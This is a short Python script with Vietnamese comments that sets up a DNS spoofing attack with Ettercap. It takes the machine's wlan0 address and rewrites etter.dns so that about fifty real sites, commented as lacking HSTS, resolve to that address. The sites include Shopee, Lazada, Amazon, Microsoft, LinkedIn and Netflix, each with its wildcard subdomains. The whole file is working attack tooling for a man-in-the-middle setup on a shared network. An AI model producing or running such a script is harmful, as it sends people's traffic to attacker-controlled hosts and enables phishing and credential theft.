import netifaces as ni
import os

# Hàm lấy địa chỉ IP của giao diện mạng wlan0
def get_wlan0_ip():
    try:
        wlan0_ip = ni.ifaddresses('wlan0')[ni.AF_INET][0]['addr']
        return wlan0_ip
    except KeyError:
        return "127.0.0.1"  # Trả về localhost nếu không tìm thấy wlan0

# Danh sách các domain
# Domains without HSTS
domains = [
    "edu.vn", "vnexpress.net", "vtv.vn", "zing.vn", "shopee.vn", "24h.com.vn",
    "kenh14.vn", "tiki.vn", "dantri.com.vn", "lazada.vn", "baomoi.com", "yahoo.com",
    "stackoverflow.com", "tuoitre.vn", "tinhte.vn", "coccoc.com", "zalo.me",
    "thanhnien.vn", "amazon.com", "microsoft.com", "zingmp3.vn", "vietnamworks.com",
    "kiotviet.com", "ngoisao.net", "soha.vn", "genk.vn", "techz.vn", "vnreview.vn",
    "codebyte.com", "codewars.com", "codesignal.com", "topcoder.com", "hackerrank.com",
    "geeksforgeeks.org", "github.io", "codecademy.com", "udemy.com", "linkedin.com",
    "edx.org", "netflix.com", "w3schools.com", "ted.com", "duolingo.com", "lang-8.com",
    "elllo.org", "prep.vn", "ielts-fighter.com", "oxfordlearnersdictionaries.com",
    "ieltsonlinetests.com", "codeforces.com", "cafef.vn", "thegioididong.com"
]


# Lấy địa chỉ IP của wlan0
wlan0_ip = get_wlan0_ip()

# Đường dẫn tới file etter.dns
etter_dns_path = "/etc/ettercap/etter.dns"  # Thay đổi đường dẫn tương ứng

# Mở file và ghi nội dung
with open(etter_dns_path, "w") as file:
    for domain in domains:
        file.write(f"{domain} A {wlan0_ip}\n")
        file.write(f"*.{domain} A {wlan0_ip}\n")

print(f"Nội dung đã được ghi vào {etter_dns_path}")

